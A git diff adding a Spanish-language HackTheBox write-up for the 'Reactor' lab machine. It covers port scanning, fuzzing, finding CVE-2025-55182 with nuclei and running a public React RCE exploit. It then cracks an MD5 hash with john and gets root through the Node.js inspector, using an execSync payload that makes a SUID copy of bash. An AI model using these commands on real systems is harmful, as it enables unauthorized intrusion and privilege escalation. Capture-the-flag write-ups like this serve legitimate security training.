@@ -2,7 +2,183 @@
 title: "Writeup Reactor"
 description: "Writeup de la máquina Reactor de HackTheBox"
 date: "2026-08-03"
-tags: ["HackTheBox", "hacking", "fuzzing", "htb", "enigma", "writeup", "john"]
+tags: ["HackTheBox", "hacking", "fuzzing", "htb", "reactor", "writeup", "john"]
 ---
 
 [![Reactor](/reactor.png)](/reactor.png)
+
+## ¿Qué encontrarás aquí?
+
+- Next.js
+- Escaneo web
+- RCE 
+- Exploit
+- Mysql
+- Escalada de privilegios
+
+## Tecnologías
+
+- Nmap
+- Node
+- John 
+- Python
+- Nuclei
+
+## Escaneo de puertos
+
+Comenzamos haciendo un escaneo de puertos de la máquina víctima con nmap.
+`sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -n -vvv -Pn 10.129.245.214 -oN reactor.txt` 
+
+Y vemos como tenemos dos puertos abiertos: 22, 3000.
+
+Así que visitamos la dirección ip por el puerto 3000 a ver que hay.
+
+[![nmap_reactor](/nmap_reactor.png)](/nmap_reactor.png)
+
+Y nos encontramos un centro de control de un reactor nuclear.
+
+Vemos una serie de empleados los cuales guardaremos porque nos pueden servir para hacer fuerza bruta a SSH.
+
+[![control_reactor](/control_reactor.png)](/control_reactor.png)
+
+## Fuzzing
+
+Examinando la web no encontramos nada relevante así que procedemos a hacer fuzzing a ver si encontramos algún subdominio. Vemos que no encontramos nada.
+
+` wfuzz -c -z file,/usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt --hh 337 "http://10.129.245.214:3000/?FUZZ=test"`
+
+## Nuclei
+
+Como no econtramos vector de ataque, este debe estar en el propio servidor, así que analizamso la web con Nuclei.
+
+`nuclei -u http://10.129.245.214:300` 
+
+Y vemos una vulnerabilidad crítica, en concreto la CVE-2025-55182 que permite la ejecución remota de código a través de deserialización insegura del protocolo "Flight" de React.
+
+[![cve_reactor](/cve_reactor.png)](/cve_reactor.png)
+
+## Explotación
+
+Buscando por internet información sobre esta vulnerabilidad me he econtrado con un repositorio que contiene un exploit para ella, así que lo usamos.
+
+Después de clonarlo en nuestra máquina solo tenemos que seguir los pasos que indica el creador.
+
+`https://github.com/Least-Significant-Bit/CVE-2025-55182` 
+
+[![exploit_reactor](/exploit_reactor.png)](/exploit_reactor.png)
+
+Los comandos para su uso son los siguientes:
+
+```
+python3 -m venv exploit_env
+source exploit_env/bin/activate
+git clone https://github.com/Least-Significant-Bit/CVE-2025-55182.git
+cd CVE-2025-55182
+pip install requests
+python3 CVE-2025-55182.py 'http://10.129.245.214:3000/'
+```
+Una vez ejecutado deberíamos tener una shell interactiva en la máquina como el usuario node.
+
+[![shell_reactor](/shell_reactor.png)](/shell_reactor.png)
+
+## Enumeración del sistema
+
+Listamos lo que hay en el directorio con `ls` y vemos que hay una base de datos, así que vamos a inspeccionarla.
+
+[![ls_reactor](/ls_reactor.png)](/ls_reactor.png)
+
+Extraemos su contenido así:
+
+`sqlite3 reactor.db .dump` 
+
+Y vemos 2 usuarios nuevos con los hashes de las contraseñas.
+
+[![dump_reactor](/dump_reactor.png)](/dump_reactor.png)
+
+Así que vamos a crackarlos.
+
+Para eso usaremos john.
+
+Ya os adelanto que el del usuario admin no pude crackearlo, pero sí engineer.
+
+´echo "39d97110eafe2a9a68639812cd271e8e" > hashes.txt´
+
+Con el anterior comando preparamos el archivo para su crackeo con john.
+
+Y con este crackeamos la pass que resulta ser reactor1.
+
+`john --format=raw-md5 hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt` 
+
+## Acceso SSH
+
+Como ya tenemos credenciales, accedemos por ssh:
+
+`ssh engineer@ip`
+
+[![ssh_reactor](/ssh_reactor.png)](/ssh_reactor.png)
+
+Ahora buscamos la flag de usuario y la leemos.
+
+## Escalada de privilegios
+
+Enumeramos el sistema en busca de un vector de escalada.
+
+`ps aux | grep node `
+
+Y hallamos un proceso crítico:
+
+`root        1415  0.0  1.1 1066928 47492 ? Ssl 12:08 0:01 /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js`
+
+[![worker_reactor](/worker_reactor.png)](/worker_reactor.png)
+
+Vemos que el proceso worker se ejecuta como root con el inspector de node.js, así que vamos a conectarnos a ese inspector.
+
+`node inspect 127.0.0.1:9229` 
+
+Introducimos el siguiente comando:
+
+`exec("process.mainModule.require('child_process').execSync('cp /bin/bash /tmp/r00t&&chmod +s /tmp/r00t')")`
+
+`.exit`
+
+Y con este otro ya seremos root:
+
+`/tmp/r00t -p`
+
+[![root_reactor](/root_reactor.png)](/root_reactor.png)
+
+## Explicación del comando
+
+- exec()
+
+Función del inspector de Node.js que permite ejecutar código JavaScript en el contexto del proceso que estamos inspeccionando.
+El código se ejecuta con los mismos privilegios que el proceso objetivo (en este caso, root).
+
+- process.mainModule
+
+process es un objeto global de Node.js que proporciona información sobre el proceso actual.
+mainModule hace referencia al módulo principal que inició la aplicación.
+Se usa para acceder al sistema de módulos desde el inspector (alternativa a require cuando require no está disponible directamente en el contexto del inspector).
+
+- .require('child_process')
+
+require() es la función de Node.js para cargar módulos.
+child_process es un módulo nativo que permite crear procesos hijos y ejecutar comandos del sistema.
+
+- .execSync('comando')
+
+execSync() es un método del módulo child_process que ejecuta un comando del sistema de forma síncrona (espera a que termine).
+Devuelve la salida del comando como un buffer.
+
+
+
+
+
+
+
+
+
+
+
+
+
